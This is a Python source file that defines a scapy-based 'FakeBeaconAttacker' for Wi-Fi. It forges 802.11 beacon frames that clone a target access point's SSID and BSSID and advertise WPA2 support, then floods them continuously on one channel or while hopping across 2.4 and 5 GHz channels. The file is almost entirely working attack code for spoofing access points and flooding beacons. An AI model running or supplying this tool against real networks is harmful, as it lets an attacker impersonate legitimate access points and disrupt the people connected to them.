from threading import Thread
import os
from time import sleep
from scapy.all import *
from scapy.layers.dot11 import *
from struct import pack

CHANNELS_2GHZ = list(range(1, 14))
CHANNELS_5GHZ = list(range(32, 69, 4)) + list(range(132, 145, 4)) + list(range(149, 170, 4))



def ChanelHopper(channel_range: list[int], interface: str, timeout):
    while True:
        for i in channel_range:
            os.system(f"iwconfig {interface} channel {i}")
            sleep(timeout)


def CreateBeacon(bssid: str, ssid: str, encryption_enabled: bool = True):
    broadcast = "ff:ff:ff:ff:ff:ff".upper()
    dot11 = Dot11(type=0, subtype=8, addr1=broadcast, addr2=bssid, addr3=bssid)
    beacon = Dot11Beacon()

    dot11elt = Dot11Elt(ID="SSID", info=str.encode(ssid), len=len(str.encode(ssid)))
    frame = RadioTap() / dot11 / beacon / dot11elt
    if encryption_enabled:  # включение поддержки шифрования в beacon кадре
        rsn_array = [b'\x01\x00',
                     b'\x00\x0f\xac\x04',
                     b'\x02\x00',
                     b'\x00\x0f\xac\x04',
                     b'\x00\x0f\xac\x02',
                     b'\x01\x00',
                     b'\x00\x0f\xac\x02',
                     b'\x00\x00']
        rsn_bytes = b''.join(rsn_array)
        rsn = Dot11Elt(ID='RSNinfo', info=rsn_bytes, len=len(rsn_bytes))
        frame = frame / rsn
    return frame


class FakeBeaconAttacker:
    channel_timeout = 2
    frequency = 2.4
    encryption = True
    send_interval = 0.001
    transmit_channel = 8
    enable_hopper = False

    def __init__(self, ssid: str, bssid: str, exclude_channel: int, interface: str, **kwargs):
        self.ssid = ssid
        self.bssid = bssid
        self.exclude_channel = exclude_channel
        self.interface = interface
        for i in kwargs.keys():
            if getattr(self, i, None) != None:
                setattr(self, i, kwargs[i])

    def findBeacon(self):
        os.system(f"iwconfig {self.interface} channel {self.exclude_channel}")
        frames = sniff(iface=self.interface, timeout=2)
        for pkt in frames:
            if pkt.haslayer("Dot11Beacon"):
                if pkt["Dot11FCS"].type == 0 and pkt["Dot11FCS"].subtype == 0x8:
                    if self.bssid in [pkt["Dot11FCS"].addr1, pkt["Dot11FCS"].addr2, pkt["Dot11FCS"].addr3]:
                        return pkt
        return None

    def generateBeacon(self, original_packet, spoof_channel):
        frame = RadioTap()
        frame = frame / original_packet["Dot11"]
        frame = frame / original_packet["Dot11Beacon"]
        frame /= Dot11Elt(ID="SSID", info=str.encode(self.ssid), len=len(str.encode(self.ssid)))
        channel_stuff = original_packet["Dot11EltDSSSet"]
        channel_stuff.channel = spoof_channel
        frame = frame / channel_stuff
        return frame

    def launch_hopper(self):
        channels = list()
        if self.frequency == 2.4:
            channels = CHANNELS_2GHZ
            channels.remove(self.exclude_channel)
        elif self.frequency == 5.0:
            channels = CHANNELS_5GHZ
            channels.remove(self.exclude_channel)
        else:
            raise Exception("PLEASE SPECIFY CORRECT FREQUENCY")

        frame = CreateBeacon(ssid=self.ssid, bssid=self.bssid, encryption_enabled=self.encryption)
        t1 = Thread(target=ChanelHopper, args=(channels, self.interface, self.channel_timeout))
        t1.start()
        sendp(frame, iface=self.interface, inter=self.send_interval, loop=1, verbose=0)
        t1.join()

    def launch_one_channel(self):
        channels = list()
        if self.frequency == 2.4:
            channels = CHANNELS_2GHZ
            if (self.exclude_channel + 4) in channels:
                self.transmit_channel = self.exclude_channel + 4
            else:
                self.transmit_channel = self.exclude_channel - 4
        elif self.frequency == 5.0:
            channels = CHANNELS_5GHZ
        else:
            raise Exception("PLEASE SPECIFY CORRECT FREQUENCY")
        # packet = self.findBeacon()
        # packet.show()
        frame = CreateBeacon(ssid=self.ssid, bssid=self.bssid, encryption_enabled=False)
        frame /= Dot11Elt(ID="DSSS Set", len=1, info=pack(">b", self.transmit_channel))
        rsn_array = [b'\x01\x00',
                     b'\x00\x0f\xac\x04',
                     b'\x02\x00',
                     b'\x00\x0f\xac\x04',
                     b'\x00\x0f\xac\x02',
                     b'\x01\x00',
                     b'\x00\x0f\xac\x02',
                     b'\x00\x00']
        rsn_bytes = b''.join(rsn_array)
        rsn = Dot11Elt(ID='RSNinfo', info=rsn_bytes, len=len(rsn_bytes))
        frame /= rsn
        os.system(f"iwconfig {self.interface} channel {self.transmit_channel}")
        sendp(frame, iface=self.interface, loop=1, verbose=0)

    def launch(self):
        if self.enable_hopper:
            self.launch_hopper()
        else:
            self.launch_one_channel()
